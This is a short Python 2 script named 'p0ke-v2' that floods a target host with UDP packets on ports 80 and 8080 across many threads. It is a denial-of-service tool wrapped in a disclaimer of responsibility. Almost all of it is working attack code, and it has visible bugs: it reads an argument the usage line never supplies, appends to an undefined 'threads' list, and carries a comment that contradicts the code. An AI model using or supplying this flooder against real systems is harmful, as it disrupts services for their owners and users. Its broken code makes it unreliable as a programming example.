###############
# #  p0ke-v2
 #
# #  Written by MsonC
 #   Please DO NOT use this script for any malicious use(s)!
# #  If you do I am not responsible for your actions
 #
# #  YOU DOWNLOAD IT! YOU TAKE RESPONSIBILITY FOR IT!
 # 
# #  Your situation may be completly different as in 3Mbps download / 1Mbps Upload.
# #  So please don't blame me because the only problem is your internet speed and bandwidth
 #   Thanks
# #
###############

import socket
import sys
import threading
import random
import time

# How to run the program - python p0ke.py   host packetlength "amount of loops"
#                          python p0ke.py 192.168.1.1 1000 100000 
# Hit CTRL + Z to stop

host = sys.argv[1]
packetLength = sys.argv[2]
amount = int(sys.argv[4])
#####
# #  Add an s after num to use that array of ports
 #   You can have as many numbers in the array as you want because the script automatically recognizes
# #  how many values are in the array
#####
portnums = [80, 8080]

# portnums = [80, 8080, 10, etc...]
portnum = []


mkstring = lambda(x): "".join(map(chr, (ord('a')+(y%26) for y in range(x))))
packet = mkstring(int(packetLength))

def dos():
    a = 0
    ports = len(portnums) - 1

    while (a < int(sys.argv[3])): # the loop will end at the number you set it to
        port = random.randint(0, ports)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # Set up socket connection for UDP AKA DGRAM
        s.sendto(packet, (host, int(portnums[port]))) # Send the packet of randomly generated text to the user specifed IP
        print ("Sending packet to port: " + str(portnums[port]) + " --- " + "Packets sent: " + str(a) + "\n")
        a += 1 # Increment A by 1 So the while loop will not be infinite
        s.close() # Close the socket outside of the whileloop.



if __name__ == '__main__':
    t = []
    for x in range(amount):
        thread = threading.Thread(target=dos)
        thread.start()
        threads.append(t)